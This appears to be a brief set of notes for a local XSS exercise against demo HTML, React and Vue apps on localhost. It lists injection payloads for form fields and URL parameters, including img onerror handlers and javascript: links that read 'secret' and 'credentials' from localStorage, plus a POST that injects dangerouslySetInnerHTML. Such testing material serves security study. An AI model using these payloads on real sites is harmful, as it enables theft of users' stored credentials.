### HTML Application

- Text box: `<img src=empty.gif onerror=alert(localStorage.getItem('secret')); />`
- Dropdown: `<img src=empty.gif onerror=alert(localStorage.getItem('secret')); />`
- Checkbox: `<img src=empty.gif onerror=alert(localStorage.getItem('secret')); />`
- Radio: `<img src=empty.gif onerror=alert(localStorage.getItem('secret')); />`
- URL: `http://127.0.0.1:3000/comments.html?server-time=%3Cimg%20src=empty.gif%20onerror=alert(localStorage.getItem(%27secret%27));%20/%3E`

### React Application

- Evaluate: `javascript:alert(localStorage.getItem('credentials'))`
- POST call:
```
fetch("http://localhost:3000/comment", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({ dangerouslySetInnerHTML: { __html: "<img src=empty.gif onerror=alert('test') />" } }),
});
```

### Vue Application

- Link: `javascript:alert(localStorage.getItem('credentials'))`
- Evaluate: `javascript:alert(localStorage.getItem('credentials'))`

- v-html